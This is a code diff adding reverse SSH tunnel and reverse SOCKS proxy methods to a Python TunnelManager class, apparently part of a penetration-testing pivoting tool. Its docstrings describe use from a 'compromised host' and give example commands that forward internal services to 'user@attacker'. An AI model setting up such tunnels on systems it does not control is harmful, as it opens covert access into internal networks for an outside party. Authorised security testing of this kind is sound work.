@@ -166,6 +166,108 @@ class TunnelManager:
         else:
             return tunnel_id, ssh_command
     
+    def create_remote_tunnel(
+        self,
+        ssh_user: str,
+        ssh_host: str,
+        remote_bind_port: int,
+        target_host: str,
+        target_port: int,
+        bind_address: str = "127.0.0.1",
+        execute: bool = True
+    ) -> Tuple[str, str]:
+        """
+        Create a remote SSH tunnel (reverse port forwarding).
+        The listening port is bound on the SSH server, forwarding from SSH client.
+        
+        Use case: When you can SSH out but can't bind ports on the compromised host.
+        Example: ssh -R 127.0.0.1:2345:10.4.50.215:5432 user@attacker
+        
+        Returns:
+            Tuple of (tunnel_id, ssh_command)
+        """
+        tunnel_id = self._generate_tunnel_id()
+        ssh_command = f"ssh -R {bind_address}:{remote_bind_port}:{target_host}:{target_port} {ssh_user}@{ssh_host} -N -f"
+        
+        if execute:
+            try:
+                process = self._execute_ssh_command(ssh_command, tunnel_id)
+                
+                with self.lock:
+                    self.active_tunnels[tunnel_id] = {
+                        "id": tunnel_id,
+                        "type": "remote",
+                        "pid": process.pid,
+                        "process": process,
+                        "command": ssh_command,
+                        "remote_bind_port": remote_bind_port,
+                        "target_host": target_host,
+                        "target_port": target_port,
+                        "bind_address": bind_address,
+                        "ssh_user": ssh_user,
+                        "ssh_host": ssh_host,
+                        "status": "active",
+                        "created_at": datetime.now().isoformat()
+                    }
+                    self._log_tunnel_event(tunnel_id, f"Remote tunnel created: {bind_address}:{remote_bind_port} -> {target_host}:{target_port}")
+                    self._update_metrics(tunnel_id, status="active")
+                
+                return tunnel_id, ssh_command
+            except Exception as e:
+                self._log_tunnel_event(tunnel_id, f"Failed to create tunnel: {str(e)}", "ERROR")
+                raise
+        else:
+            return tunnel_id, ssh_command
+
+    def create_remote_dynamic_tunnel(
+        self,
+        ssh_user: str,
+        ssh_host: str,
+        remote_socks_port: int,
+        bind_address: str = "127.0.0.1",
+        execute: bool = True
+    ) -> Tuple[str, str]:
+        """
+        Create a remote dynamic SSH tunnel (reverse SOCKS proxy).
+        The SOCKS proxy port is bound on the SSH server, forwarding from SSH client.
+        
+        Use case: When you can SSH out but need flexible access to multiple internal services.
+        Example: ssh -R 9998 user@attacker (creates SOCKS proxy on attacker's machine)
+        
+        Returns:
+            Tuple of (tunnel_id, ssh_command)
+        """
+        tunnel_id = self._generate_tunnel_id()
+        ssh_command = f"ssh -R {bind_address}:{remote_socks_port} {ssh_user}@{ssh_host} -N -f"
+        
+        if execute:
+            try:
+                process = self._execute_ssh_command(ssh_command, tunnel_id)
+                
+                with self.lock:
+                    self.active_tunnels[tunnel_id] = {
+                        "id": tunnel_id,
+                        "type": "remote_dynamic",
+                        "pid": process.pid,
+                        "process": process,
+                        "command": ssh_command,
+                        "remote_socks_port": remote_socks_port,
+                        "bind_address": bind_address,
+                        "ssh_user": ssh_user,
+                        "ssh_host": ssh_host,
+                        "status": "active",
+                        "created_at": datetime.now().isoformat()
+                    }
+                    self._log_tunnel_event(tunnel_id, f"Remote dynamic tunnel created: SOCKS proxy on {bind_address}:{remote_socks_port}")
+                    self._update_metrics(tunnel_id, status="active")
+                
+                return tunnel_id, ssh_command
+            except Exception as e:
+                self._log_tunnel_event(tunnel_id, f"Failed to create tunnel: {str(e)}", "ERROR")
+                raise
+        else:
+            return tunnel_id, ssh_command
+
     def create_dynamic_tunnel(
         self,
         ssh_user: str,
